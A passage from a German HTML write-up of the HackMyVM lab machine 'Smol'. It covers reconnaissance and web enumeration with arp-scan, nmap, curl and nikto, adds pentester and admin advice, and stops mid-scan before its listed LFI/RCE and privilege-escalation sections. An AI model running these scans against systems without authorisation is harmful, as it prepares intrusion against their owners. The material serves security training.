@@ -1,0 +1,2246 @@
+﻿﻿﻿```html
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smol - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Smol - HackMyVM - Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">jq</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (LFI/RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt"> <pre>
+┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                   <span class="command">192.168.2.164</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Befehl dient der Identifizierung der IP-Adresse des Zielsystems im lokalen Netzwerk (Layer 2). `arp-scan -l` sendet ARP-Anfragen an alle möglichen Adressen im lokalen Subnetz. Die Ausgabe wird dann mittels `grep "PCS"` nach Geräten gefiltert, deren MAC-Adresse dem Hersteller "PCS Systemtechnik GmbH" zugeordnet ist (dies ist oft ein Hinweis auf VirtualBox-VMs). Schließlich extrahiert `awk '{print $1}'` nur die IP-Adresse aus der gefilterten Zeile.</p>
+            <p class="evaluation">**Bewertung:** Das Zielsystem wurde erfolgreich im lokalen Netzwerk unter der IP-Adresse `192.168.2.164` identifiziert. Dies ist der erste entscheidende Schritt, um gezielte Scans und Angriffe durchführen zu können. Die Methode ist effizient für die lokale Netzwerkerkundung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die identifizierte IP-Adresse `192.168.2.164` sollte in einer Variablen (z.B. `$IP`) gespeichert oder notiert werden, um sie in nachfolgenden Befehlen wiederverwenden zu können. Starten Sie nun detailliertere Scans (z.B. mit Nmap) auf diese IP.<br>**Empfehlung (Admin):** Netzwerksegmentierung und die Überwachung von ARP-Anfragen können helfen, die Erkennung von Systemen im Netzwerk zu erschweren. Sicherstellen, dass nur autorisierte Geräte im Netzwerk kommunizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+
+
+
+Interface: eth0, type: EN10MB, MAC: 08:00:27:ee:49:a2, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.1	38:e1:f4:22:ac:ac	(Unknown)</span>
+<span class="command">192.168.2.30	8c:98:06:22:c3:49	SHENZHEN SEI ROBOTICS CO.,LTD</span>
+<span class="command">192.168.2.31	bc:f8:7e:ac:41:00	(Unknown)</span>
+<span class="command">192.168.2.32	80:47:86:96:f6:3a	Samsung Electronics Co.,Ltd</span>
+<span class="command">192.168.2.120	84:25:19:2f:66:32	Samsung Electronics</span>
+<span class="command">192.168.2.161	08:bf:b8:c1:fd:13	(Unknown)</span>
+<span class="command">192.168.2.164	08:00:27:57:82:f0	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist die ungefilterte Ausgabe des `arp-scan -l`-Befehls. Sie listet alle Geräte auf, die auf die ARP-Anfragen im lokalen Netzwerk geantwortet haben, zusammen mit ihrer IP-Adresse, MAC-Adresse und dem (soweit bekannten) Hersteller der Netzwerkkarte.</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe bestätigt die Präsenz verschiedener Geräte im Netzwerk und liefert deren MAC-Adressen. Die Zeile `192.168.2.164 08:00:27:57:82:f0 PCS Systemtechnik GmbH` sticht heraus und bestätigt das Zielsystem, das wir zuvor gefiltert haben. Die anderen gelisteten Geräte könnten ebenfalls von Interesse sein, liegen aber außerhalb des Scopes dieses spezifischen Tests.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Bestätigt die Ziel-IP. Keine weitere Aktion basierend auf dieser spezifischen Ausgabe erforderlich, da die relevante Information bereits extrahiert wurde.<br>**Empfehlung (Admin):** Regelmäßige Überprüfung der im Netzwerk aktiven Geräte. Unbekannte oder nicht autorisierte Geräte sollten untersucht werden. MAC-Adressfilterung kann als zusätzliche (wenn auch nicht unüberwindbare) Sicherheitsebene dienen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+/etc/hosts
+
+               <span class="command">192.168.2.154   wakanda1.vln</span>
+               <span class="command">192.168.2.155   weakness.vln weakness.jth</span>
+               <span class="command">192.168.2.156   violator.vln</span>
+       #       192.168.2.157   register.cybox.company
+               <span class="command">192.168.2.158   warzone2.vln</span>
+               <span class="command">192.168.2.159   warzone1.vln</span>
+               <span class="command">192.168.2.160   dc9.vln</span>
+       #       192.168.2.161   dc2.vln dc-2
+               <span class="command">192.168.2.162   buster.hmv</span>
+       #       192.168.2.163   dc1.vln
+               <span class="command">192.168.2.164   smol.hmv</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser Ausschnitt zeigt einen Teil der `/etc/hosts`-Datei auf dem Angreifer-System (Kali/CCat). Diese Datei wird verwendet, um Hostnamen manuell IP-Adressen zuzuordnen, bevor eine DNS-Anfrage gestellt wird. Hier wurde der Hostname `smol.hmv` der zuvor gefundenen IP-Adresse `192.168.2.164` zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Das Hinzufügen dieses Eintrags ist eine wichtige Vorbereitung für die Web-Enumeration. Viele Webanwendungen und virtuelle Hosts reagieren nur korrekt, wenn sie über ihren konfigurierten Hostnamen angesprochen werden. Ohne diesen Eintrag würden Anfragen an `192.168.2.164` möglicherweise nicht zum erwarteten Web-Inhalt führen (wie später bei `curl` und `nmap` ersichtlich wird).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Es ist gute Praxis, gefundene IP-Adressen und potenzielle Hostnamen (insbesondere bei CTFs oder wenn Hinweise darauf bestehen) in die `/etc/hosts`-Datei einzutragen, um die Interaktion mit Webdiensten zu erleichtern.<br>**Empfehlung (Admin):** Aus Admin-Sicht ist die `/etc/hosts`-Datei des Angreifers irrelevant. Wichtig ist die korrekte Konfiguration des eigenen DNS-Servers und der virtuellen Hosts auf dem Webserver.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+ <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd=$(ip neigh | grep ^fe80 2&gt;/dev/null| grep -ve "fe80::1\|fe80::a00:27ff:fe30:2eda\|fe80::8247:86ff:fe96:f63a\|fe80::50f1:22ff:fec4:ad12\|fe80::a5aa:636f:a4bf:d441");</span></div>
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd2=$(echo $cmd |  awk '{print $1}' | sort -u);</span></div>
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap $cmd2 -6;</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 23:01 CET
+Nmap scan report for smol (<span class="command">fe80::a00:27ff:fe57:82f0</span>)
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">22/tcp open  ssh</span>
+<span class="command">80/tcp open  http</span>
+MAC Address: <span class="command">08:00:27:57:82:F0 (Oracle VirtualBox virtual NIC)</span>
+
+Nmap scan report for fe80::d0a5:97c8:ee04:6f55
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 17.04 seconds</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Diese Befehlskette versucht, IPv6-Nachbarn im lokalen Netzwerk zu identifizieren und zu scannen.
+1. `ip neigh | grep ^fe80 2>/dev/null`: Listet bekannte Nachbarn (ARP/NDP-Cache) auf und filtert nach Link-Local-IPv6-Adressen (beginnend mit `fe80`). Fehler werden unterdrückt (`2>/dev/null`).
+2. `grep -ve "..."`: Filtert bekannte oder uninteressante Adressen (Router, Angreifer-Maschine, andere bekannte Geräte) heraus.
+3. `echo $cmd | awk '{print $1}' | sort -u`: Extrahiert die reinen IPv6-Adressen aus den gefilterten Zeilen und entfernt Duplikate.
+4. `nmap $cmd2 -6`: Führt einen Nmap-Standardscan (TCP SYN) gegen die gefundenen IPv6-Adressen durch.</p>
+            <p class="evaluation">**Bewertung:** Der Scan identifiziert die Link-Local-IPv6-Adresse des Ziels (`fe80::a00:27ff:fe57:82f0`, korreliert mit der MAC `08:00:27:57:82:F0`) und bestätigt, dass Port 22 (SSH) und Port 80 (HTTP) auch über IPv6 erreichbar sind. Eine weitere, unbekannte IPv6-Adresse wurde gefunden, scheint aber keine offenen Ports zu haben. IPv6 ist oft ein übersehener Angriffsvektor.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie sich die IPv6-Adresse und die offenen Ports. Obwohl Angriffe oft über IPv4 erfolgen, könnte IPv6 in späteren Phasen relevant werden oder alternative Zugriffspfade bieten.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass die IPv6-Firewall-Regeln genauso robust sind wie die IPv4-Regeln. Wenn IPv6 nicht aktiv genutzt wird, sollte es auf den Systemen und im Netzwerk nach Möglichkeit deaktiviert oder stark eingeschränkt werden, um die Angriffsfläche zu reduzieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sU --top-port 1000 -T5 -n $IP -Pn --min-rate 5000</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 23:01 CET
+Nmap scan report for 192.168.2.164
+Host is up (0.00034s latency).
+Not shown: 994 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+<span class="command">1019/udp  closed unknown</span>
+<span class="command">1066/udp  closed fpo-fns</span>
+<span class="command">22341/udp closed unknown</span>
+<span class="command">31365/udp closed unknown</span>
+<span class="command">34892/udp closed unknown</span>
+<span class="command">49259/udp closed unknown</span>
+MAC Address: <span class="command">08:00:27:57:82:F0 (Oracle VirtualBox virtual NIC)</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen UDP-Scan (`-sU`) auf die Top 1000 UDP-Ports (`--top-port 1000`) der Ziel-IP-Adresse (`$IP`, also 192.168.2.164) durch. `-T5` steht für ein sehr aggressives Timing, `-n` deaktiviert die DNS-Auflösung, `-Pn` überspringt die Host-Discovery (da wir wissen, dass der Host aktiv ist) und `--min-rate 5000` versucht, mindestens 5000 Pakete pro Sekunde zu senden, um den Scan zu beschleunigen.</p>
+            <p class="evaluation">**Bewertung:** Der Scan zeigt, dass die meisten der gescannten Top-1000-UDP-Ports entweder `open|filtered` sind (Nmap erhielt keine Antwort, was auf einen offenen Port oder eine Firewall hindeuten kann) oder explizit `closed` (Nmap erhielt eine "ICMP Port Unreachable"-Nachricht). Es wurden keine eindeutig offenen UDP-Ports identifiziert. UDP-Scans sind von Natur aus langsamer und unzuverlässiger als TCP-Scans.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Da keine eindeutig offenen UDP-Ports gefunden wurden und UDP-Dienste seltener primäre Angriffsvektoren darstellen (Ausnahmen wie SNMP, NFS, ältere DNS-Versionen existieren), kann man sich zunächst auf die identifizierten TCP-Ports konzentrieren. Ein vollständiger UDP-Scan (`-p-`) könnte später bei Bedarf durchgeführt werden, wäre aber sehr zeitaufwändig.<br>**Empfehlung (Admin):** Schließen Sie nicht benötigte UDP-Ports auf der Host-Firewall. Seien Sie sich bewusst, dass Firewalls UDP-Traffic oft einfach verwerfen (`DROP`), was zu `open|filtered`-Ergebnissen führt und die Erkundung erschwert, aber keine definitive Aussage über den Portstatus erlaubt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn --min-rate 5000 | grep open</span></div>
+                     <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen TCP SYN-Scan (`-sS`, "Stealth Scan") auf alle 65535 TCP-Ports (`-p-`) der Ziel-IP (`$IP`) durch. `-sC` führt Standard-Nmap-Skripte zur Diensterkennung und Schwachstellenprüfung aus. `-sV` versucht, die Version der laufenden Dienste zu ermitteln. `-AO` versucht, das Betriebssystem zu erkennen. `-Pn` überspringt wieder die Host-Discovery und `--min-rate 5000` beschleunigt den Scan. Die Ausgabe wird mit `grep open` gefiltert, um nur die Zeilen anzuzeigen, die offene Ports enthalten.</p>
+            <p class="evaluation">**Bewertung:** Dieser Scan identifiziert die primären Angriffsvektoren auf TCP-Ebene: Port 22 (SSH, Version OpenSSH 8.2p1 auf Ubuntu) und Port 80 (HTTP, Version Apache httpd 2.4.41 auf Ubuntu). Die Versionsinformationen sind entscheidend für die Suche nach bekannten Schwachstellen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie die weiteren Bemühungen auf SSH (Port 22) und HTTP (Port 80). Recherchieren Sie nach bekannten Schwachstellen für OpenSSH 8.2p1 und Apache 2.4.41 unter Ubuntu. Beginnen Sie mit der Web-Enumeration auf Port 80.<br>**Empfehlung (Admin):** Halten Sie Dienste wie SSH und Apache immer auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Überprüfen Sie die Konfiguration von SSH (z.B. Deaktivierung von Passwort-Logins zugunsten von Schlüsselpaaren) und Apache (z.B. unnötige Module deaktivieren, Sicherheitsheader setzen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn --min-rate 5000</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 23:02 CET
+Nmap scan report for <span class="command">smol.hmv (192.168.2.164)</span>
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: <span class="password">Did not follow redirect to http://www.smol.hmv/</span>
+MAC Address: <span class="command">08:00:27:57:82:F0 (Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms smol.hmv (192.168.2.164)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist die vollständige Ausgabe des vorherigen Nmap-Scans (ohne `grep`). Sie enthält zusätzliche Details, die durch die Skripte (`-sC`), Versionserkennung (`-sV`) und Betriebssystemerkennung (`-AO`) gesammelt wurden.
+*   **SSH (Port 22):** Zeigt die Host-Schlüssel des Servers an. Bestätigt Version OpenSSH 8.2p1 unter Ubuntu.
+*   **HTTP (Port 80):** Bestätigt Apache 2.4.41 unter Ubuntu. Das Skript `http-title` gibt einen wichtigen Hinweis: Der Server versucht, auf `http://www.smol.hmv/` weiterzuleiten, wenn er über die IP-Adresse angesprochen wird. Dies bestätigt die Notwendigkeit des `/etc/hosts`-Eintrags.
+*   **OS Detection:** Nmap vermutet ein Linux-System mit Kernel 4.x oder 5.x.
+*   **Traceroute:** Zeigt, dass das Ziel direkt erreichbar ist (1 Hop).</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe liefert wertvolle Detailinformationen. Der wichtigste neue Fund ist die Bestätigung der Weiterleitung auf Port 80, die auf einen konfigurierten virtuellen Host (`www.smol.hmv`) hindeutet. Die genauen Versionen von SSH und Apache sind für die Schwachstellensuche essenziell. Die OS-Erkennung ist eine gute Bestätigung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass der Hostname `www.smol.hmv` in der `/etc/hosts`-Datei des Angreifer-Systems auf die IP `192.168.2.164` verweist. Führen Sie nun gezielte Web-Enumerationstools (Nikto, Gobuster, WPScan etc.) gegen `http://www.smol.hmv` aus. Recherchieren Sie bekannte Schwachstellen für OpenSSH 8.2p1 und Apache 2.4.41.<br>**Empfehlung (Admin):** Halten Sie Betriebssystem und Dienste aktuell. Überprüfen Sie die Notwendigkeit der angezeigten SSH-Schlüsseltypen. Konfigurieren Sie Webserver-Weiterleitungen bewusst und sicher. Implementieren Sie Sicherheitsheader (siehe Nikto-Scan später).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sY -n -p- $IP -Pn --min-rate 5000</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 23:02 CET
+Nmap scan report for 192.168.2.164
+Host is up (0.00059s latency).
+All 65535 scanned ports on 192.168.2.164 are in ignored states.
+Not shown: 65504 filtered sctp ports (no-response), 31 filtered sctp ports (proto-unreach)
+MAC Address: <span class="command">08:00:27:57:82:F0 (Oracle VirtualBox virtual NIC)</span>
+
+Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen SCTP INIT Scan (`-sY`) auf alle 65535 SCTP-Ports (`-p-`) der Ziel-IP (`$IP`) durch. SCTP (Stream Control Transmission Protocol) ist ein weiteres Transportprotokoll, das weniger verbreitet ist als TCP oder UDP. `-n`, `-Pn` und `--min-rate` haben die gleiche Bedeutung wie zuvor.</p>
+            <p class="evaluation">**Bewertung:** Der Scan findet keine offenen SCTP-Ports. Alle Ports sind entweder `filtered` (keine Antwort) oder `filtered` mit `proto-unreach` (ICMP Protocol Unreachable Nachricht erhalten). Dies deutet stark darauf hin, dass SCTP auf dem Zielsystem nicht aktiv genutzt oder von einer Firewall blockiert wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** SCTP kann in der Regel ignoriert werden, es sei denn, es gibt spezifische Hinweise auf dessen Verwendung (z.B. in Telekommunikationsumgebungen). Konzentrieren Sie sich auf die offenen TCP-Ports.<br>**Empfehlung (Admin):** Wenn SCTP nicht benötigt wird, stellen Sie sicher, dass es auf System- und Netzwerkebene deaktiviert oder blockiert ist, um die Angriffsfläche unnötig zu vergrößern.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div>
+                     <pre>
+*   Trying 192.168.2.164:80...
+* <span class="password">Connected to 192.168.2.164 (192.168.2.164) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.164
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 302 Found</span>
+&lt; Date: Mon, 10 Feb 2025 22:02:42 GMT
+&lt; Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+&lt; Location: <span class="command">http://www.smol.hmv</span>
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+
+* <span class="password">Connection #0 to host 192.168.2.164 left intact</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `curl` wird hier verwendet, um eine HTTP-Anfrage an die IP-Adresse des Ziels auf Port 80 zu senden. `-I` sendet eine HEAD-Anfrage (fordert nur die Header, nicht den Body an). `-v` (verbose) zeigt detaillierte Informationen über die Verbindung und die Header an. Die Anfrage wird explizit an die IP-Adresse (`http://$IP`) gesendet.</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe bestätigt eindrücklich die Beobachtung aus dem Nmap-Scan: Der Server antwortet mit einem `HTTP/1.1 302 Found` Statuscode. Dies ist eine Weiterleitung. Der `Location`-Header gibt das Weiterleitungsziel an: `http://www.smol.hmv`. Dies beweist, dass der Webserver so konfiguriert ist, dass er Anfragen an die IP-Adresse auf den Hostnamen `www.smol.hmv` umleitet. Ohne den `/etc/hosts`-Eintrag würden wir die eigentliche Webseite nicht sehen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Bestätigt die Notwendigkeit, alle weiteren Web-Anfragen an den Hostnamen `www.smol.hmv` zu richten. Verwenden Sie ab jetzt `http://www.smol.hmv` in Tools wie Nikto, Gobuster, WPScan etc.<br>**Empfehlung (Admin):** Überprüfen Sie die Konfiguration der virtuellen Hosts und Weiterleitungen. Stellen Sie sicher, dass diese wie beabsichtigt funktionieren. Es ist üblich, Anfragen an die IP auf einen Standard-vHost oder einen spezifischen Hostnamen umzuleiten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://$IP -s</span></div>
+                     <pre>
+*   Trying 192.168.2.164:80...
+* <span class="password">Connected to 192.168.2.164 (192.168.2.164) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.164
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 302 Found</span>
+&lt; Date: Mon, 10 Feb 2025 22:02:42 GMT
+&lt; Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+&lt; Location: <span class="command">http://www.smol.hmv</span>
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+
+* <span class="password">Connection #0 to host 192.168.2.164 left intact</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Befehl ist nahezu identisch mit dem vorherigen `curl`-Befehl. `--verbose` entspricht `-v`. Der Zusatz `-s` (silent) unterdrückt die Fortschrittsanzeige von curl, zeigt aber weiterhin die Header wegen `-I` und die verbose-Ausgabe wegen `--verbose` an. Das Ergebnis ist daher identisch.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt erneut die 302-Weiterleitung von der IP-Adresse zum Hostnamen `www.smol.hmv`. Keine neuen Erkenntnisse gegenüber dem vorherigen Befehl.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dieser Schritt war redundant. Fahren Sie mit der Enumeration gegen den Hostnamen `http://www.smol.hmv` fort.<br>**Empfehlung (Admin):** Keine zusätzlichen Empfehlungen basierend auf dieser redundanten Überprüfung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.164</span>
++ Target Hostname:    <span class="command">192.168.2.164</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2025-02-10 23:02:44 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / <span class="password">redirects to: http://www.smol.hmv</span>
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ <span class="command">Apache/2.4.41</span> appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2025-02-10 23:03:27 (GMT1) (43 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Hier wurde Nikto, ein Webserver-Scanner, gegen die IP-Adresse (`192.168.2.164`) ausgeführt. Nikto prüft auf bekannte gefährliche Dateien/CGIs, veraltete Softwareversionen und serverspezifische Konfigurationsprobleme.</p>
+            <p class="evaluation">**Bewertung:** Da Nikto gegen die IP-Adresse lief, sind die Ergebnisse begrenzt, weil der Server sofort auf `http://www.smol.hmv` weiterleitet. Nikto erkennt diese Weiterleitung korrekt. Die wichtigsten Ergebnisse sind:
+*   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), die auf Best-Practice-Konfigurationsmängel hindeuten.
+*   Die Bestätigung der veralteten Apache-Version (2.4.41).
+*   Keine offensichtlichen CGI-Verzeichnisse gefunden (zumindest nicht auf der Weiterleitungsseite).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Nikto erneut aus, diesmal explizit gegen den Hostnamen `http://www.smol.hmv`, um die tatsächliche Webanwendung zu scannen. Notieren Sie die fehlenden Header und die veraltete Apache-Version als potenzielle Angriffspunkte oder Informationsquellen.<br>**Empfehlung (Admin):** Implementieren Sie die empfohlenen Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, `Strict-Transport-Security` etc.), um Clickjacking und MIME-Sniffing-Angriffe zu verhindern. Aktualisieren Sie den Apache-Webserver auf die neueste stabile Version, um bekannte Schwachstellen zu schließen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://www.smol.hmv</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.164</span>
++ Target Hostname:    <span class="command">www.smol.hmv</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2025-02-10 23:07:17 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">Drupal Link header found</span> with value: &lt;http://www.smol.hmv/index.php/wp-json/&gt;; rel="https://api.w.org/". See: https://www.drupal.org/
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /index.php?: <span class="password">Uncommon header 'x-redirect-by' found, with contents: WordPress.</span>
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ <span class="command">Apache/2.4.41</span> appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /: <span class="password">A Wordpress installation was found.</span>
++ /wp-login.php?action=register: <span class="password">Cookie wordpress_test_cookie created without the httponly flag.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /wp-content/uploads/: <span class="password">Directory indexing found.</span>
++ /wp-content/uploads/: <span class="password">Wordpress uploads directory is browsable.</span> This may reveal sensitive information.
++ /wp-login.php: <span class="password">Wordpress login found.</span>
